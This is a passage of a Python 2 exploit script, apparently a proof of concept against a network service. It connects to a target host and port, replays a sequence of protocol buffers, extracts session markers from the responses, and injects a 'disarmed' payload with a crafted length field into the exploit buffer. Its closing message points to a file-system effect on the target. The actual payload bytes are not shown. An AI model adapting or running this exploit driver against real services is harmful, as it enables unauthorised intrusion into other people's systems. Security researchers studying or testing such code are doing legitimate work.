        sys.exit (0)

    # Variablen
    tm = False
    source_port = -1
    marker = ""
    header_part = ""
    idx = 0
    payload = ""
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))
    print "[+] Connected. Source port is {}".format (s.getsockname ()[1])
    source_port = s.getsockname ()[1]
    
    while (idx < len(prot_dict)):
        buffer = prot_dict [idx].buffer
        #
        # do we have a source port? or other variable
        # we need to replace
        #
        if ((prot_dict [idx].format_src_port or prot_dict [idx].format_marker or 
             prot_dict[idx].has_header_part) and not prot_dict [idx].is_exploit):
            buffer = buffer.format (marker = marker, port = source_port, header_part = header_part)
        elif prot_dict [idx].is_exploit:
            # need to encode the length as it needs to be otherwise the decimal
            # representation of the number will be included in the payload
            payload_length = prot_dict [idx].length_before_payload + len(payload_disarmed) - 10 - 4
            payload_length_as_byte = get_payload_len_as_byte_arr (payload_length)
            buffer = buffer.format (marker = marker, 
                                    payload = payload_disarmed, 
                                    payload_length = payload_length_as_byte, 
                                    header_part = header_part)     
                                    
        s.send (buffer)
        print ("[+] Sent buffer nr {}".format((idx+1)))
        if prot_dict [idx].wait_for_resp:
            d = s.recv (prot_dict [idx].resp_buffer_size)
            # second response contains the marker that we need
            # to retain and the header_part
            if idx == 1:
                header_part = d[10:14]
                marker = d[39:43]
                
        idx = idx + 1
    
    print "[!] Done! Check your file system."












